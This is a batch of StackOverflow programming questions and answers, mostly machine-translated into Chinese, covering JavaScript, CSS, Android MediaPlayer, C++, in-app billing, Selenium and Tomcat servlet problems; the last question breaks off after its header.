# StackOverflow 问答 15526000-15526999

# javascript - Remove status bar on IE8

> ID：15526000
> 
> 赞同：0
> 
> 时间：2013-03-20T14:13:23.487
> 
> 标签：javascript, jquery, html, css

there is any way to remove status bar from IE8 browsers using javascript or jquery or someting else.

Thank you!

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T14:15:18.687

该`window.open`方法接受可选的参数，允许您禁用 IE 中的状态栏

```
window.open('/yourpage.html','_blank','status=no'); 
```

（在没有状态栏的新窗口中打开 yourpage.html）

请注意，这仅适用于受信任的站点。

如果您的网站不受信任，则用户必须明确启用

> 允许网站打开没有地址或状态栏的窗口

在 Internet 站点区域安全设置中

# jquery - 无法调用未定义的“on”方法

> ID：15526010
> 
> 赞同：0
> 
> 时间：2013-03-20T14:13:57.900
> 
> 标签：jquery, fusioncharts, aloha-editor

我正在尝试在同一页面上集成 FusionCharts 和 Aloha 编辑器。由于 Aloha 依赖于 jquery，我假设这就是导致某种冲突的原因，但我无法解决它，我整天都在努力解决它。任何帮助，将不胜感激。谢谢

```
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <title>Getting Started with Aloha Editor</title>
    <link rel="stylesheet" href="index.css" type="text/css">
    <link rel="stylesheet" href="aloha.css" type="text/css">
    <script src="require.js"></script>
    <script src="jquery-1.7.2.js"></script>
    <script type="text/javascript" src="FusionCharts/FusionCharts.js"></script>
    <script src="aloha.js" data-aloha-plugins="common/ui,common/format,common/highlighteditables,common/link"></script>
</head>
<body>
    <div id="main">
        <div id="content"><p>Getting started with Aloha Editor!</p></div>

        <div id="chartContainer">FusionCharts XT will load here!</div> 
    </div>
    <script type="text/javascript">
    Aloha.ready( function() {
        Aloha.jQuery('#content').aloha();
    });
        var myChart = new FusionCharts("Column3D", "myChartId", "400", "300");
        myChart.setXMLData("<chart caption='Weekly Sales Summary' xAxisName='Week' " +
        "yAxisName='Sales' numberPrefix='$'>" +
          "<set label='Week 1' value='14400' />" +
          "<set label='Week 2' value='19600' />" +
          "<set label='Week 3' value='24000' />" +
          "<set label='Week 4' value='15700' />" +
        "</chart>");
        myChart.render("chartContainer");
    </script>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T22:22:17.940

我使用您提供的完全相同的 HTML 重新创建了您的问题。这似乎是异步资源加载的问题`eve.js`- 一个`Raphael`依赖的内部组件。有三种方法可以解决此问题：

> 请注意，这是在 FusionCharts 版本中首次检测到的问题`3.3.0-release.18739`，可能不适用于其他版本。

# 1.**最简单的修复**

手动包含脚本文件`FusionCharts.js`，`FusionCharts.HC.js`并`FusionCharts.HC.Charts.js`按此特定顺序。

# 2.**编辑FusionCharts.HC.js**

`FusionCHarts.HC.js`这是对源文件的简单单行编辑。如果您有缩小版本，（这可能看起来很难看）...找到**第 144 行**并替换该行的第一部分

`FusionCharts(["private","modules.renderer.js-raphael",function(){var l=this.hcLib,i,r=window.Raphael,C;(function(d){var j=/[\.\/]/,i=function(){},e=function(d,e){return d-e},l,r,C={n:{}},M=function(d,j)`

和

`FusionCharts(["private","modules.renderer.js-raphael",function(){var l=hfeve=this.hcLib,i,r=window.Raphael,C;(function(d){var j=/[\.\/]/,i=function(){},e=function(d,e){return d-e},l,r,C={n:{}},M=hfeve.eve=function(d,j)`

> 如果您有源文件，则找到第 5535 行`FusionCharts.HC.js`并将整行替换为`eve = lib.eve = function(name, scope) {`

# 3.使用修改后的代码。

我附上了一个链接到已修补的 FusionCharts.HC.js（缩小版），适用于试用版（在许可版本上未经测试）并与 v3.3.0.18739 兼容。期待 FusionCharts 的下一个版本将以某种方式解决这个问题。:)

[http://pastebin.com/raw.php?i=Zbhaq5hP](http://pastebin.com/raw.php?i=Zbhaq5hP)

PS：Pastebin 链接不会永远存在。因此，一旦托管链接可用，将更新和修改帖子。

# css - 选择所有 ID，其中唯一的区别是 ID 名称中的数字

> ID：15526011
> 
> 赞同：5
> 
> 时间：2013-03-20T14:13:59.247
> 
> 标签：css, css-selectors

我有所有这些**div 具有相同的 ID**名称，除了它们最后都有不同的数字。

我知道我可以使用一个类，但它必须是一个 ID。

```
 <div id="myid1">text</div>
    <div id="myid2">text</div>
    <div id="myid3">text</div>
    <div id="myid4">text</div>

   <div id="test1">text</div>
   <div id="test2">text</div> 
```

我的问题是使用 css 我如何才能选择它们但比这更短。

```
#myid1,#myid2,#myid3,#myid4{
    color:red;
} 
```

这种类型的东西是否存在，如果存在，你怎么写？

```
myid1[*]{
    color:red;
} 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-03-20T14:16:28.380

只需使用前缀属性选择器

```
[id^="myid"] {

} 
```

此选择器针对具有前缀“myid”的 ID 属性的任何元素 - 值周围的引号是可选的。此选择器也适用于 IE7 及更高版本。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T14:16:36.373

您可以使用[此 attr 选择器开头](http://www.w3.org/TR/selectors/)。

```
[id^=myid] {
    color:red;
} 
```

[演示](http://jsfiddle.net/7va6M/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-20T14:17:35.533

CSS3 在这里应该有所帮助：

```
div[id^="myid"] 
```

和

```
div[id^="test"] 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-20T14:16:08.003

是的，有办法

```
<div id="myid1" class="foo">text</div>
<div id="myid2" class="foo">text</div>
<div id="myid3" class="foo">text</div>
<div id="myid4" class="foo">text</div>

<div id="test1">text</div>
<div id="test2">text</div> 
```

和CSS

```
.foo { color:red; } 
```

# 更新

如果这些必须是 ID，请尝试使用`[id^=myid]`

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-20T14:17:16.853

我认为使用类会更好，因为增量 ID 违反了 HTML 和一般编程原则。你可以像这样重写它：

```
<div class="myid" data-id="1">text</div>
<div class="myid" data-id="2">text</div> 
```

但是，如果您*必须*保持`id`s 原样，则可以使用属性选择器：

```
[id^=myid] {
    color: red;
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-03-20T14:31:13.493

在你的情况下，这会做到：

```
[id=^"myid"] {
    //your rules
} 
```

这将选择 id 属性以“myid”开头的所有元素。

不过，您不仅限于 id 属性。事实上，您可以使用任何其他 html 元素的属性。

假设您要选择所有“href”属性以“ [http://stackoverflow.com](http://stackoverflow.com) ”开头的 <a> 标签。以下将做到这一点：

```
a[href=^"http://stackoverflow.com"] {} 
```

真的有很多选择。我不会自己指出它们，而是链接到所有详细信息的 w3 页面：http: [//www.w3.org/TR/selectors/#attribute-selectors](http://www.w3.org/TR/selectors/#attribute-selectors)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-03-20T14:18:40.207

除了 ids 之外使用类（如果你真的需要 ids）：

```
<div class="mytext" id="myid1">text</div>
<div class="mytext" id="myid2">text</div>
<div class="mytext" id="myid3">text</div>
<div class="mytext" id="myid4">text</div>

<div id="test1">text</div>
<div id="test2">text</div> 
```

那么CSS很简单：

```
div.mytext {
    color: red;
} 
```

# javascript - JavaScript：无法警告输出值

> ID：15526021
> 
> 赞同：0
> 
> 时间：2013-03-20T14:14:37.370
> 
> 标签：javascript

代码非常简单。

HTML：

```
<div class="simpleDiv" id="Child1" onmouseover="expandDiv(this);"></div> 
```

CSS：

```
.simpleDiv {
    background-color: red; 
    width: 100px; 
    height: 50px; 
    margin: 5px; 
    margin-left: 50px; 
    opacity: 1;
} 
```

JavaScript：

```
function expandDiv(object){
    alert(document.getElementById(object.id).style.height);
} 
```

为什么我不能像这样提醒 div 的高度？如果我使用函数 hasAttribute 提醒 id 或类，那可以正常工作，但无法提醒元素的 css 属性。

任何帮助表示赞赏！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T14:17:05.377

Why not just `alert(object.style.height)`?

Anyway, the reason it doesn't work is because `elem.style.property` only works with inline `style="..."` attributes. To take into account all styles, you need this:

```
alert(window.getComputedStyle(object).height) 
```

Older versions of IE don't support this, but it's a very easy shim:

```
window.getComputedStyle = window.getComputedStyle || function(e) {return e.currentStyle;}; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T14:20:02.733

```
function expandDiv(object){

    alert(document.getElementById(object.id).innerHeight);

} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T14:18:16.790

尝试使用：

```
alert(document.getElementById(object.id).offsetHeight); 
```

这是描述： [MDN 上的 offsetHeight](https://developer.mozilla.org/en/docs/DOM/element.offsetHeight)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-20T14:22:46.597

使用 JQuery：

```
 alert($('#Child1').css("height"); 
```

或者要更改属性，请使用：

```
$('#Child1').css("height", value ) 
```

如果您不想要 JQuery，请忽略。

# android - Android MediaPlayer AudioStream AudioFlinger 服务器死机！，致命信号 11

> ID：15526023
> 
> 赞同：4
> 
> 时间：2013-03-20T14:14:44.360
> 
> 标签：android, media-player, forceclose, servicemanager, audioflinger

我有两个片段（左和右），并在左片段中获取 Radiostreams 列表。通过单击这些流之一，正确的片段应该更改流的名称并开始使用给定的 uri 播放流。

2 问题：

1.  一些无线电流不是最新的，所以它们中的很多不再工作了。问题是，这会导致我的应用程序强制关闭！我做了错误处理，但在调用这样的流之后，我得到：

> 03-20 14:23:28.192: A/libc(1021): 致命信号 11 (SIGSEGV) 在 0x00000000 (code=1)
> 
> 03-20 14:23:28.192: W/AudioSystem(1021): AudioFlinger 服务器死了！
> 
> 03-20 14:23:28.192: W/IMediaDeathNotifier(1021): 媒体服务器死机
> 
> 03-20 14:23:28.192: E/MediaPlayer(1021): 错误 (100, 0)
> 
> 03-20 14:23:28.192: I/ServiceManager(1021): 等待服务 media.audio_flinger...
> 
> 03-20 14:23:28.752: I/dalvikvm(1021): threadid=3: 对信号 3 做出反应
> 
> 03-20 14:23:28.782: I/dalvikvm(1021): 将堆栈跟踪写入“/data/anr/traces.txt”
> 
> 03-20 14:23:29.192: I/ServiceManager(1021): 等待服务 media.audio_flinger...

我不知道为什么。还有其他方法可以进行错误处理吗？或者有没有办法在调用 mediaPlayer.setDataSource(uri) 之前检查所有流以避免准备 defekt uris？（最后见我的代码）

1.  我用遥控器控制左边的 ListFragment。当我尝试从一个频道快速切换到另一个频道时，一切都非常滞后。似乎 Mediaplayer 的重新实例化需要很长时间。当我不重新实例化时，当我再次调用 mediaPlayer.setDataSource(..) 时会出现运行时错误。有没有办法在一个 MediaPlayer 对象上调用 .setDataSource 两次？

这是我的代码：我的 MediaPlayer Wrapper 类：

```
package net.smart4life.tvplay.model;

import java.io.IOException;
import java.lang.reflect.Method;
import java.util.AbstractCollection;
import java.util.ArrayList;
import java.util.EnumSet;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaPlayer.OnBufferingUpdateListener;
import android.media.MediaPlayer.OnCompletionListener;
import android.media.MediaPlayer.OnErrorListener;
import android.media.MediaPlayer.OnInfoListener;
import android.media.MediaPlayer.OnPreparedListener;
import android.util.Log;

/**
 * A wrapper class for {@link android.media.MediaPlayer}.
 * <p>
 * Encapsulates an instance of MediaPlayer, and makes a record of its internal
 * state accessible via a {@link MediaPlayerWrapper#getState()} accessor.
 */
public class MediaPlayerStateWrapper {

    private static String tag = "MediaPlayerWrapper";
    private MediaPlayer mPlayer;
    private State currentState;
    private MediaPlayerStateWrapper mWrapper;

    public MediaPlayerStateWrapper() {
        mWrapper = this;
        mPlayer = new MediaPlayer();
        currentState = State.IDLE;
        mPlayer.setOnPreparedListener(mOnPreparedListener);
        mPlayer.setOnCompletionListener(mOnCompletionListener);
        mPlayer.setOnBufferingUpdateListener(mOnBufferingUpdateListener);
        mPlayer.setOnErrorListener(mOnErrorListener);
        mPlayer.setOnInfoListener(mOnInfoListener);
    }

    /* METHOD WRAPPING FOR STATE CHANGES */
    public static enum State {
        IDLE, ERROR, INITIALIZED, PREPARING, PREPARED, STARTED, STOPPED, PLAYBACK_COMPLETE, PAUSED;
    }

    public void setDataSource(String path) {
        if (currentState == State.IDLE) {
            try {
                mPlayer.setDataSource(path);
                currentState = State.INITIALIZED;
            } catch (IllegalArgumentException e) {
                e.printStackTrace();
            } catch (IllegalStateException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        } else
            throw new RuntimeException();
    }

    public void prepareAsync() {
        Log.d(tag, "prepareAsync()");
        if (EnumSet.of(State.INITIALIZED, State.STOPPED).contains(currentState)) {
            mPlayer.prepareAsync();
            currentState = State.PREPARING;
        } else
            throw new RuntimeException();
    }

    public boolean isPlaying() {
        Log.d(tag, "isPlaying()");
        if (currentState != State.ERROR) {
            return mPlayer.isPlaying();
        } else
            throw new RuntimeException();
    }

    public void seekTo(int msec) {
        Log.d(tag, "seekTo()");
        if (EnumSet.of(State.PREPARED, State.STARTED, State.PAUSED,
                State.PLAYBACK_COMPLETE).contains(currentState)) {
            mPlayer.seekTo(msec);
        } else
            throw new RuntimeException();
    }

    public void pause() {
        Log.d(tag, "pause()");
        if (EnumSet.of(State.STARTED, State.PAUSED).contains(currentState)) {
            mPlayer.pause();
            currentState = State.PAUSED;
        } else
            throw new RuntimeException();
    }

    public void start() {
        Log.d(tag, "start()");
        if (EnumSet.of(State.PREPARED, State.STARTED, State.PAUSED,
                State.PLAYBACK_COMPLETE).contains(currentState)) {
            mPlayer.start();
            currentState = State.STARTED;
        } else
            throw new RuntimeException();
    }

    public void stop() {
        Log.d(tag, "stop()");
        if (EnumSet.of(State.PREPARED, State.STARTED, State.STOPPED,
                State.PAUSED, State.PLAYBACK_COMPLETE).contains(currentState)) {
            mPlayer.stop();
            currentState = State.STOPPED;
        } else
            throw new RuntimeException();
    }

    public void reset() {
        Log.d(tag, "reset()");
        mPlayer.reset();
        currentState = State.IDLE;
    }

    /**
     * @return The current state of the mediaplayer state machine.
     */
    public State getState() {
        Log.d(tag, "getState()");
        return currentState;
    }

    public void release() {
        Log.d(tag, "release()");
        mPlayer.release();
    }

    /* INTERNAL LISTENERS */
    private OnPreparedListener mOnPreparedListener = new OnPreparedListener() {

        @Override
        public void onPrepared(MediaPlayer mp) {
            Log.d(tag, "on prepared");
            currentState = State.PREPARED;
            mWrapper.onPrepared(mp);
            mPlayer.start();
            currentState = State.STARTED;
        }
    };
    private OnCompletionListener mOnCompletionListener = new OnCompletionListener() {

        @Override
        public void onCompletion(MediaPlayer mp) {
            Log.d(tag, "on completion");
            currentState = State.PLAYBACK_COMPLETE;
            mWrapper.onCompletion(mp);
        }
    };
    private OnBufferingUpdateListener mOnBufferingUpdateListener = new OnBufferingUpdateListener() {

        @Override
        public void onBufferingUpdate(MediaPlayer mp, int percent) {
            Log.d(tag, "on buffering update");
            mWrapper.onBufferingUpdate(mp, percent);
        }
    };
    private OnErrorListener mOnErrorListener = new OnErrorListener() {

        @Override
        public boolean onError(MediaPlayer mp, int what, int extra) {
            Log.d(tag, "on error");
            currentState = State.ERROR;
            mWrapper.onError(mp, what, extra);
            return false;
        }
    };
    private OnInfoListener mOnInfoListener = new OnInfoListener() {

        @Override
        public boolean onInfo(MediaPlayer mp, int what, int extra) {
            Log.d(tag, "on info");
            mWrapper.onInfo(mp, what, extra);
            return false;
        }
    };

    /* EXTERNAL STUBS TO OVERRIDE */
    public void onPrepared(MediaPlayer mp) {
    }

    public void onCompletion(MediaPlayer mp) {
    }

    public void onBufferingUpdate(MediaPlayer mp, int percent) {
    }

    boolean onError(MediaPlayer mp, int what, int extra) {
        // Error Handling of type: "MEdiaPlayer error(100,0)
        mp.stop();
        mp.release();
        return false;
    }

    public boolean onInfo(MediaPlayer mp, int what, int extra) {
        return false;
    }

    /* OTHER STUFF */
    public int getCurrentPosition() {
        if (currentState != State.ERROR) {
            return mPlayer.getCurrentPosition();
        } else {
            return 0;
        }
    }

    public int getDuration() {
        // Prepared, Started, Paused, Stopped, PlaybackCompleted
        if (EnumSet.of(State.PREPARED, State.STARTED, State.PAUSED,
                State.STOPPED, State.PLAYBACK_COMPLETE).contains(currentState)) {
            return mPlayer.getDuration();
        } else {
            return 100;
        }
    }
} 
```

这是我的 TestFragment（右片段）。注意：左边的 Fragment 从 TestFragment 调用方法“newChannel(radioChannel)”，每次点击一个列表项。

```
package net.smart4life.tvplay.fragment;

import java.io.IOException;

import net.smart4life.tvplay.R;
import net.smart4life.tvplay.model.MediaPlayerStateWrapper;
import net.smart4life.tvplay.model.RadioChannel;
import android.app.Fragment;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaPlayer.OnErrorListener;
import android.media.MediaPlayer.OnPreparedListener;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.TextView;
import android.widget.Toast;

public class TestFragment extends Fragment {

    private RadioChannel radioCh;
    private TextView tv_RadioCh;
    private MediaPlayerStateWrapper mediaWrapper;
    private View view;

    // firstcall
    public TestFragment(RadioChannel radioChannel) {
        this.radioCh = radioChannel;
    }

    @Override
    public void onActivityCreated(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onActivityCreated(savedInstanceState);

        setRetainInstance(true);

        tv_RadioCh = (TextView) view.findViewById(R.id.radioText);

        mediaWrapper = new MediaPlayerStateWrapper();

        newChannel(radioCh);
    }

    public void newChannel (RadioChannel radioChannel) {
        this.radioCh = radioChannel;
        Log.e("RadioChannel", radioCh.getName());
        tv_RadioCh.setText(radioCh.getName());

        if(mediaWrapper.isPlaying()) {
            mediaWrapper.stop();
            mediaWrapper.reset(); 
        } else if(mediaWrapper.getState() == MediaPlayerStateWrapper.State.PREPARING) {
            mediaWrapper.release();
            mediaWrapper = new MediaPlayerStateWrapper();
        }
        mediaWrapper.setDataSource(radioCh.getUrl().toString());    
        mediaWrapper.prepareAsync();
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {

        view = inflater.inflate(R.layout.fragment_radio_player, container,
                false);

        return view;
    }

    @Override
    public void onDetach() {
        super.onDetach();

        mediaWrapper.release();
    }

} 
```

专业人士，你能帮我解决一个或两个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-25T14:15:53.387

如果流无法加载，您经常陷入准备状态，您可以在此处尝试此操作，当`mediaWrapper.getState() == MediaPlayerStateWrapper.State.ERROR`：

```
mediaWrapper.reset();
mediaWrapper.release();
System.gc();
mediaWrapper = new MediaPlayerStateWrapper();
mediaWrapper.setDataSource(radioCh.getUrl().toString());
mediaWrapper.prepareAsync(); 
```

最好把它放在一个`AsyncTask`，避免*出现Notresponsive错误*。或者当您收到错误时，您必须创建一个新的 MediaPlayer，因为*Media Server 已死亡*：

```
if(mediaWrapper.getState() == MediaPlayerStateWrapper.State.ERROR){
    mediaWrapper = new MediaPlayerStateWrapper();
    mediaWrapper.setDataSource(radioCh.getUrl().toString());
    mediaWrapper.prepareAsync();
} 
```

如果`MediaPlayer`正在播放流，则必须先停止并重置它：

```
mediaWrapper.stop();
mediaWrapper.reset();
mediaWrapper.setDataSource(radioCh.getUrl().toString());
mediaWrapper.prepareAsync(); 
```

它对我有用，但我认为这不是最好的方法。当您陷入准备状态时，希望有人能找到更好的解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-10-28T11:10:58.157

关于audioflinger服务错误，正如您所注意到的，它被标记为“what == 100”或error(100,0)。

根据我的卑微经验，您可以采取哪些措施来避免 audioflinger 错误：

1.  避免快速调用服务（我确实在创建播放器后添加了 500 毫秒的延迟）
2.  限制同时活动的并发 Mediaplayer 的数量。

你可以做些什么来处理audioflinger错误：

1.  检测 audioflinger 错误 100，设置它发生的标志并**禁用 GUI**（建议仅释放播放器，因为当它已经处于错误状态时停止它是不安全的，并且会抛出 IllegalStateException & error(38,0)
2.  启动另一个继续测试服务的线程返回（可以通过创建一个没有例外的新媒体播放器），超时时间为 5-10 秒
3.  当服务返回时，重置标志并重新启用 GUI

所以参考你的代码：

```
boolean onError(MediaPlayer mp, int what, int extra) {
    // Error Handling of type: "MEdiaPlayer error(100,0)
    mp.release();
    // here you add logic communicating the wrapper or main UI thread
    // to disable GUI and set a flag
    return false;
} 
```

然后在包装器中添加一个方法来处理这个问题。

当您解决此问题并发布解决方案时，我将不胜感激。我也面临着一个非常相似的问题。

# c++ - 二分法中的输入方程，C++

> ID：15526024
> 
> 赞同：7
> 
> 时间：2013-03-20T14:14:46.200
> 
> 标签：c++, bisection

我有这个代码：

```
#include <iostream>
#include <cmath>
#include <stdlib.h>
using namespace std;
double f(double x);
double biseccion(double a, double b, double tolerancia, int maxiter);
int main()
{
    double a, b, raiz;
    double tolerancia=0.00000;
    int maxiter=25;
    cout << "Input begin of interval: ";
    cin >> a;
    cout << "Input end of interval: ";
    cin >> b;
    cout << "\n";
    cout << "  # de"<<"\n"<<"Iteration"<<"\t"<<"   A"<<"\t"<<"   B"<<"\t"<<"   C"<<"\t"<<"   f(c)"<<endl;
    raiz=biseccion(a,b,tolerancia,maxiter);
    cout << "\n";
    cout << "The root is: "<< raiz <<endl;
    return 0;
}

 double f(double x)
 {
        return x*x*x-x-2;
 }
 double biseccion(double a, double b, double tolerancia, int maxiter)
 {
        double c;
        int numiter=1;
        do
        {
            c=(a+b)/2;
            if(f(a)*f(c)<0)
            {
               b=c;
            }
            else
            {
               a=c;
            }
            cout<<"     "<<numiter<<"\t"<<"\t"<<a<<"\t"<<b<<"\t"<<c<<"\t"<<f(c)<<endl;
            numiter++;
         }
         while((abs(f(c))>tolerancia)&&(numiter<maxiter));
         return c;
} 
```

我希望用户在询问间隔开始之前输入它，而不是在我的代码中写“x*x*xx-2”。我怎样才能做到这一点？

我尝试使用变量来存储“x*x*xx-2”，但没有任何作用。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-20T14:23:08.127

您需要解析输入，它可能不像您想象的那么容易，但有一些库可以帮助您。

muparser.sourceforge.net/

code.google.com/p/expressionparser/

partow.net/programming/exprtk/index.html

这也是 c# 中的一个解决方案，它也可能对您有所帮助。

[.NET 中是否有字符串数学评估器？](https://stackoverflow.com/questions/355062/is-there-a-string-math-evaluator-in-net/392355#392355)

# android - 在应用计费：消费和购买项目然后更新库存，缓存？

> ID：15526036
> 
> 赞同：2
> 
> 时间：2013-03-20T14:15:22.550
> 
> 标签：android, in-app-billing

## 问题

我正在尝试在应用计费 v3 中实现，除了一件事之外，一切都很好。消费或购买商品后，我会拨打请求电话以更新库存。但是结果总是产生旧的库存而不是新的库存，添加或删除的项目。

这可能是预期的行为，我确实有一个解决方法，但它仍然很烦人。

## 解决方法

我的工作存在于应用内计费的特殊“处理程序/包装器”中。这个“处理程序”有一个简单的生命周期。

**1\. create（新调用）：**创建一个新`IabHelper`对象并使用公钥做一些魔术

**2\. startUp：**调用`startSetup`方法，`IabHelper`成功时设置一个标志。如果成功，它会进行更新库存调用。

**3.close ：**销毁IabHelper对象

处理程序实现该`onQueryInventoryFinished`方法，当调用此方法并且结果为成功时，使用此方法提供的 Inventory 参数更新本地 Inventory 对象。

所以基本上我制作的处理程序有两个字段，一个 Inventory 和一个用于成功设置的标志。例如，处理程序还具有用于回调活动的自定义接口。

还有两种方法：`buy and consume`.

成功购买或消费商品后，我想更新当前库存，但这不像之前所说的那样工作。

我的解决方法：从本地 Inventory 对象中手动删除或添加购买。（这应该在购买或消费方法中完成。）

## 更好的方法？

有没有更好的“更容易接受”的方式来做到这一点？

# selenium-webdriver - 错误：从 DatabaseClosed Connection 获取数据时

> ID：15526038
> 
> 赞同：0
> 
> 时间：2013-03-20T14:15:25.903
> 
> 标签：selenium-webdriver

在运行 TestSuite 中存在的两个测试用例时，我遇到了一个奇怪的问题。测试套件包含 15 个测试用例，这两个分别是第 9 和第 10 个 Tc。

当我只运行这两个测试用例时，它们都运行良好，但是在整个测试套件运行的情况下，报告中不存在这两个。（完全被跳过）

这两个测试用例都具有执行数据库查询并从数据库中获取患者姓名的功能，在控制台中我们已经看到这是错误背后的根本原因。我们正面临“错误：从数据库 Io 获取数据异常：连接重置”--9th Tc 在从 DatabaseClosed Connection 获取数据时“--10th Tc

我们编写的代码如下获取患者姓名：

```
 try
    {
        stmt =con.createStatement(); //public static java.sql.Statement stmt;public static ResultSet rs;public static Connection con; these 3 we declared in driver script

        rs=stmt.executeQuery("select d.id, c.first_name, c.last_name, d.ssn from Table1 d, Table2 c  where c.id=d.contact_id and d.facility_id='"+facilityID+"' and d.security_id='"+securityID+"' and <Some condition> and d.id not in (<Some data>);
        if (rs.next() == true){
            DBFirstName=rs.getString(2);
            DBLastName=rs.getString(3);
            DBFullName = DBLastName +", " +DBFirstName;
            System.out.println("DB Full Name ="+DBFullName);
        }else{
            System.out.println("Inside else"); 
            return "Fail :Unable to fetch Patient data(lastname) from database";
        }
    }

    catch(Throwable t)
    {
        APPLICATION_LOGS.debug("Error : In fetching data from Database" +t.getMessage());
        System.out.println("Error : In fetching data from Database" +t.getMessage());
    }

    rs.close();
    stmt.close(); 
```

如果有人有任何想法，请告诉我。提前致谢。尼兰詹。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-07T19:15:00.890

请检查数据库连接是否已打开。Con.open() 可能会完成这项工作。并且还尝试检查堆栈跟踪，我猜它会在您开始使用连接时立即出现，因为它未打开。请检查并告诉

# tomcat - 发布请求在我的 servlet 中不起作用，但获取请求可以

> ID：15526042
> 
> 赞同：1
> 
> 时间：2013-03-20T14:15:32.323
> 
> 标签：tomcat, servlets, intellij-idea

我创建了一个能够响应 get 和 post 请求的 servlet。问题是，当我使用表单发送发布请求时，我没有得到任何响应。这是代码。

xmlServlet.java：

```
package org.skiabox.myservlet;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

public class XmlServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        String fullName = request.getParameter("fullName");
        String userName = request.getParameter("userName");
        out.println("Hello from POST method " + userName + "! We know your full name is " + fullName);

        String prof = request.getParameter("prof");
        out.println("<br/>" + "You are a " + prof);

    }

    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();

        String userName = request.getParameter("userName");
        out.println("Hello " + userName);
    }
} 
```

* * *

SimpleForm.html：

```
<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
    <form method="post" action="/XmlServletPath">
        User Name:<input name="userName"/>
        Full Name:<input name="fullName"/>
        <br/>
        <br/>
        Profession:
        <input type="radio" name="prof" value="Developer">Developer</input>
        <input type="radio" name="prof" value="Architect">Architect</input>
        <input type="submit"/>
    </form>
</body>
</html> 
```

* * *

网页.xml：

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://java.sun.com/xml/ns/javaee"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
           xsi:schemaLocation="http://java.sun.com/xml/ns/javaee
          http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
           version="3.0">

    <welcome-file-list>
        <welcome-file>index.jsp</welcome-file>
    </welcome-file-list>

    <servlet>
        <description>A simple servlet</description>
        <display-name>SimpleServlet</display-name>
        <servlet-name>SimpleServlet</servlet-name>
        <servlet-class>org.skiabox.myservlet.SimpleServlet</servlet-class>
    </servlet>
    <servlet>
        <servlet-name>XmlServlet</servlet-name>
        <servlet-class>org.skiabox.myservlet.XmlServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>SimpleServlet</servlet-name>
        <url-pattern>/SimpleServlet</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>XmlServlet</servlet-name>
        <url-pattern>/XmlServletPath</url-pattern>
    </servlet-mapping>
</web-app> 
```

* * *

SimpleServletProject.iml：

```
<?xml version="1.0" encoding="UTF-8"?>
<module type="JAVA_MODULE" version="4">
  <component name="FacetManager">
    <facet type="web" name="Web">
      <configuration>
        <descriptors>
          <deploymentDescriptor name="web.xml" url="file://$MODULE_DIR$/web/WEB-INF/web.xml" />
        </descriptors>
        <webroots>
          <root url="file://$MODULE_DIR$/web" relative="/" />
        </webroots>
      </configuration>
    </facet>
  </component>
  <component name="NewModuleRootManager" inherit-compiler-output="true">
    <exclude-output />
    <content url="file://$MODULE_DIR$">
      <sourceFolder url="file://$MODULE_DIR$/src" isTestSource="false" />
    </content>
    <orderEntry type="inheritedJdk" />
    <orderEntry type="sourceFolder" forTests="false" />
    <orderEntry type="library" scope="PROVIDED" name="Tomcat 7.0" level="application_server_libraries" />
  </component>
</module> 
```

雄猫设置： ![图片1](../Images/36ce657562316f662c8e310de73417e2.png)

![图2](../Images/5a2b51b6988e501f8c0579339f9cc53a.png)

输入详细信息的页面 url :`http://localhost:8080/SimpleServletProject/SimpleForm.html`

按下提交后的结果页面（完全为空）url：`http://localhost:8080/XmlServletPath`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T15:11:36.793

您的 servlet 正在监听`http://localhost:8080/SimpleServletProject/XmlServletPath`，而不是监听`http://localhost:8080/XmlServletPath`。您的表单提交到了错误的 URL。

只需相应地修复表单操作 URL。代替

```
<form method="post" action="/XmlServletPath"> 
```

经过

```
<form method="post" action="/SimpleServletProject/XmlServletPath"> 
```

或者，如果显示表单的页面无论如何都在同一个 URL 文件夹中

```
<form method="post" action="XmlServletPath"> 
```

或者，如果您担心上下文路径的动态性

```
<form method="post" action="${pageContext.request.contextPath}/XmlServletPath"> 
```

# android - HttpPut 获取完整的请求字符串

> ID：15526044
> 
> 赞同：0
> 
